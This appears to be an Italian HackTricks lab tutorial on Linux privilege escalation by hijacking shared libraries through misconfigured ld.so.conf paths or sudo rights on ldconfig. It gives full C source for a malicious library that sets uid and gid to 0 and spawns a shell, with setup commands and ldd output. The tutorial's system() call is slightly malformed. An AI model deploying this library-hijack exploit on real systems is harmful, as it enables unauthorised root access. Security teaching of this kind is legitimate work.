# ld.so privesc exploit example

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.

</details>

## Prepara l'ambiente

Nella sezione seguente puoi trovare il codice dei file che useremo per preparare l'ambiente

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

```c
#include <stdio.h>

void vuln_func();
```

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```

{% tabs %}
{% tab title="Italian" %}
1. **Crea** questi file nella tua macchina nella stessa cartella
2. **Compila** la **libreria**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` in `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilegi di root)
4. **Compila** l'**eseguibile**: `gcc sharedvuln.c -o sharedvuln -lcustom`

#### Verifica l'ambiente

Verifica che _libcustom.so_ venga **caricata** da _/usr/lib_ e che tu possa **eseguire** il binario.
{% endtab %}
{% endtabs %}

```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

## Sfruttare

In questo scenario supponiamo che **qualcuno abbia creato una voce vulnerabile** all'interno di un file in _/etc/ld.so.conf/_:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

La cartella vulnerabile è _/home/ubuntu/lib_ (dove abbiamo accesso in scrittura).\
**Scarica e compila** il seguente codice all'interno di quel percorso:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```

Ora che abbiamo **creato la libreria malevola libcustom all'interno del percorso configurato in modo errato**, dobbiamo aspettare un **riavvio** o che l'utente root esegua **`ldconfig`** (_nel caso in cui tu possa eseguire questo binario come **sudo** o abbia il **bit suid**, sarai in grado di eseguirlo tu stesso_).

Una volta che ciò è accaduto, **ricontrolla** da dove viene caricata la libreria `libcustom.so` nell'eseguibile `sharevuln`:

```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

Come puoi vedere, viene **caricato da `/home/ubuntu/lib`** e se un utente lo esegue, verrà eseguita una shell:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
Si noti che in questo esempio non abbiamo ottenuto privilegi elevati, ma modificando i comandi eseguiti e **attendendo che l'utente root o un altro utente privilegiato esegua il binario vulnerabile**, saremo in grado di ottenere privilegi elevati.
{% endhint %}

### Altre configurazioni errate - Stessa vulnerabilità

Nell'esempio precedente abbiamo simulato una configurazione errata in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione all'interno di `/etc/ld.so.conf.d/`**.\
Ma ci sono altre configurazioni errate che possono causare la stessa vulnerabilità, se si hanno **permessi di scrittura** su alcuni **file di configurazione** all'interno di `/etc/ld.so.conf.d`, nella cartella `/etc/ld.so.conf.d` o nel file `/etc/ld.so.conf`, è possibile configurare la stessa vulnerabilità e sfruttarla.

## Exploit 2

**Supponiamo di avere privilegi sudo su `ldconfig`**.\
È possibile indicare a `ldconfig` **da dove caricare i file di configurazione**, quindi possiamo sfruttarlo per far caricare a `ldconfig` cartelle arbitrarie.\
Quindi, creiamo i file e le cartelle necessari per caricare "/tmp":

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Ora, come indicato nell'**exploit precedente**, **crea la libreria malevola all'interno di `/tmp`**.\
Infine, carichiamo il percorso e verifichiamo da dove viene caricata la libreria binaria:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**Come puoi vedere, avendo i privilegi sudo su `ldconfig` puoi sfruttare la stessa vulnerabilità.**

{% hint style="info" %}
**Non ho trovato** un modo affidabile per sfruttare questa vulnerabilità se `ldconfig` è configurato con il **bit suid**. Compare l'errore seguente: `/sbin/ldconfig.real: Impossibile creare il file di cache temporanea /etc/ld.so.cache~: Permesso negato`
{% endhint %}

## Riferimenti

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab machine in HTB

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
